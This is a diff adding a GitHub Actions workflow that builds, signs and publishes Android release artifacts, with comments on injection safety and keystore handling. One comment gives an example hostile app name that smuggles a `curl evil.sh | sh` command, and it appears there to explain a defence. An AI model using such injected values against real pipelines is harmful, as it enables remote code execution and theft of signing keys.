@@ -1,0 +1,176 @@
+name: Build app
+
+# workflow_dispatch returns no run id, so the dashboard cannot correlate a build
+# with its run. Putting the build id in the run name makes the run findable by a
+# single list query instead of guessing from timestamps.
+run-name: Build ${{ inputs.build_id }}
+
+# Runs in the user's own GitHub account, against their own Actions quota.
+#
+# Two rules govern every line below:
+#
+#   1. NO untrusted value is ever interpolated into a run: block with ${{ }}.
+#      App names, URLs and versions come from the user's dashboard, so treating
+#      them as trusted would be a script-injection hole: an app named
+#      `a"; curl evil.sh | sh; echo "` would execute. They arrive as env vars,
+#      which the shell never re-parses.
+#   2. The upload keystore lives only in RUNNER_TEMP, never in the workspace,
+#      is never uploaded as an artifact, and is removed even when the build fails.
+
+on:
+  workflow_dispatch:
+    inputs:
+      build_id:
+        description: Build id from the dashboard, echoed back for correlation
+        required: true
+        type: string
+      version_code:
+        description: Monotonic version code; the build service owns this counter
+        required: true
+        type: string
+      version_name:
+        description: User-facing version, e.g. 1.4.0
+        required: true
+        type: string
+      outputs:
+        description: Artifacts to produce
+        required: true
+        default: apk,aab
+        type: string
+
+# Least privilege: the job needs to publish a release and nothing else.
+permissions:
+  contents: write
+
+# One build at a time per project. Two concurrent builds would race on the same
+# version code and publish two different artifacts under one version.
+concurrency:
+  group: web2app-build
+  cancel-in-progress: false
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+
+    steps:
+      # Actions are pinned to full commit SHAs, not tags. A tag can be moved; this
+      # job holds a signing key, so a moved tag would be a key-exfiltration path.
+      - name: Checkout project
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          persist-credentials: false
+
+      - name: Set up JDK 17
+        uses: actions/setup-java@de7274f081f381c8f8158605e0321c36c376e2e6 # v6.0.1
+        with:
+          distribution: temurin
+          java-version: '17'
+
+      - name: Set up Android SDK
+        uses: android-actions/setup-android@40fd30fb8d7440372e1316f5d1809ec01dcd3699 # v4.0.1
+        with:
+          packages: 'platforms;android-37 build-tools;36.0.0 platform-tools'
+
+      - name: Set up Gradle
+        uses: gradle/actions/setup-gradle@9c971963bec38e04b3d30dcc455b5382be2fdbfb # v6.3.0
+        with:
+          # Dependency caching only. The configuration cache is never written here
+          # (build-release.sh passes --no-configuration-cache) because it
+          # serialises env values, including the signing password — the cause of
+          # GHSA-h3qr-39j9-4r5v.
+          cache-read-only: ${{ github.ref_name != 'main' }}
+
+      - name: Read build configuration
+        id: config
+        run: |
+          set -euo pipefail
+          test -f app/src/main/assets/config.json || { echo "::error::config.json missing"; exit 1; }
+          # jq output goes to the environment file, never through the shell, so a
+          # hostile app name cannot become a command.
+          {
+            echo "app_name=$(jq -r '.metadata.app_name' app/src/main/assets/config.json)"
+            echo "application_id=$(jq -r '.metadata.package_name' app/src/main/assets/config.json)"
+            echo "cleartext=$(jq -r '(.source.url // "") | startswith("http://")' app/src/main/assets/config.json)"
+            echo "minify=$(jq -r '.build.minify // false' app/src/main/assets/config.json)"
+            echo "shrink=$(jq -r '.build.shrink_resources // false' app/src/main/assets/config.json)"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Materialise upload keystore
+        env:
+          KEYSTORE_B64: ${{ secrets.W2A_UPLOAD_KEYSTORE_B64 }}
+        run: |
+          set -euo pipefail
+          if [ -z "${KEYSTORE_B64:-}" ]; then
+            echo "::error::W2A_UPLOAD_KEYSTORE_B64 is not set — this project has no upload key"
+            exit 1
+          fi
+          # umask first: the file must never be group/world readable, even briefly.
+          umask 077
+          printf '%s' "$KEYSTORE_B64" | base64 -d > "$RUNNER_TEMP/upload-keystore.p12"
+          # Outside the workspace, so it cannot be committed or picked up by a
+          # later artifact upload.
+          test -s "$RUNNER_TEMP/upload-keystore.p12"
+
+      - name: Build and verify signed release
+        env:
+          # Signing material. GitHub masks secret values in logs automatically.
+          W2A_KEYSTORE_PATH: ${{ runner.temp }}/upload-keystore.p12
+          W2A_KEYSTORE_PASSWORD: ${{ secrets.W2A_KEYSTORE_PASSWORD }}
+          W2A_KEY_ALIAS: ${{ secrets.W2A_KEY_ALIAS }}
+          # The pin. A build signed by any other key fails here rather than at Play.
+          W2A_KEY_FINGERPRINT: ${{ vars.W2A_KEY_FINGERPRINT }}
+          W2A_OUTPUTS: ${{ inputs.outputs }}
+          # Untrusted, so: env vars only, quoted at use, never inlined.
+          APP_NAME: ${{ steps.config.outputs.app_name }}
+          APPLICATION_ID: ${{ steps.config.outputs.application_id }}
+          CLEARTEXT: ${{ steps.config.outputs.cleartext }}
+          MINIFY: ${{ steps.config.outputs.minify }}
+          SHRINK: ${{ steps.config.outputs.shrink }}
+          VERSION_CODE: ${{ inputs.version_code }}
+          VERSION_NAME: ${{ inputs.version_name }}
+        run: |
+          set -euo pipefail
+          bash scripts/build-release.sh . \
+            -Pw2aAppName="$APP_NAME" \
+            -Pw2aApplicationId="$APPLICATION_ID" \
+            -Pw2aVersionCode="$VERSION_CODE" \
+            -Pw2aVersionName="$VERSION_NAME" \
+            -Pw2aCleartext="$CLEARTEXT" \
+            -Pw2aMinify="$MINIFY" \
+            -Pw2aShrinkResources="$SHRINK"
+
+      - name: Publish artifacts to a release
+        env:
+          # gh is preinstalled; using it avoids giving a third-party action access
+          # to a job that has touched the signing key.
+          GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
+          TAG: build-${{ inputs.build_id }}
+          APP_NAME: ${{ steps.config.outputs.app_name }}
+          VERSION_NAME: ${{ inputs.version_name }}
+          VERSION_CODE: ${{ inputs.version_code }}
+        run: |
+          set -euo pipefail
+          FILES=()
+          [ -f app/build/outputs/apk/release/app-release.apk ] && FILES+=("app/build/outputs/apk/release/app-release.apk")
+          [ -f app/build/outputs/bundle/release/app-release.aab ] && FILES+=("app/build/outputs/bundle/release/app-release.aab")
+          if [ ${#FILES[@]} -eq 0 ]; then
+            echo "::error::no artifacts were produced"
+            exit 1
+          fi
+          # Releases, not actions/upload-artifact: release assets have no storage
+          # quota and no 90-day expiry, where the Free plan gives artifacts 500 MB
+          # and deletes them.
+          gh release create "$TAG" "${FILES[@]}" \
+            --title "$APP_NAME $VERSION_NAME ($VERSION_CODE)" \
+            --notes "Signed release build. APK for sideloading and testing; AAB for Google Play upload."
+
+      - name: Remove keystore
+        # always(): a failed build must not leave key material on a runner. On
+        # GitHub-hosted runners the VM is destroyed anyway, but self-hosted
+        # runners are reused.
+        if: always()
+        run: |
+          shred -u "$RUNNER_TEMP/upload-keystore.p12" 2>/dev/null \
+            || rm -f "$RUNNER_TEMP/upload-keystore.p12" \
+            || true
